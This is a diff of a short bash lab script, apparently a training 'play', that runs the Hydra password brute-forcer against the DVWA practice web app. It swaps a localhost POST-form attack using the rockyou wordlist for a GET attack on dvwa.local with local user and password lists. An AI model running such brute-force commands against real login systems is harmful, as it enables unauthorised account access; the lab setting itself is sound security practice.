@@ -1,9 +1,7 @@
-#!/bin/bash
-echo "[INFO] Iniciando Play 02 — Hydra em DVWA"
-TARGET="http://localhost:80/dvwa/login.php"
-USER="admin"
-PASSLIST="/usr/share/wordlists/rockyou.txt"
 
-hydra -l $USER -P $PASSLIST $TARGET http-post-form "username=^USER^&password=^PASS^:Login failed"
-
-echo "[SUCESSO] Ataque finalizado. Verifique saída acima."
+#!/usr/bin/env bash
+set -e
+echo "[INFO] Play 02 — Hydra DVWA"
+TARGET="dvwa.local"
+hydra -L users.txt -P pass.txt ${TARGET} http-get /login.php || true
+echo "[SUCESSO] Ataque concluído"
